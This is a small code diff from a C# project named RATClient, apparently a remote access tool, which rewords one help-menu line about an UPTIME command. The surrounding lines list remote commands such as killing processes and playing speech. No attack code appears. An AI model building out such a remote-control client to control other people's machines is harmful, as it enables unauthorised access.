@@ -194,7 +194,7 @@ namespace RATClient
             Console.WriteLine("TALK [phrase]            Say A Phrase With Text To Speech");
             Console.WriteLine("TASKKILL [path]          Kill A Running Process");
             Console.WriteLine("TREE [path]              Return A Folder Structure");
-            Console.WriteLine("UPTIME                   Return The Server Uptime");
+            Console.WriteLine("UPTIME                   Return The Computer Uptime");
         }
         static T DeserializeFromXml<T>(string xml)
         {
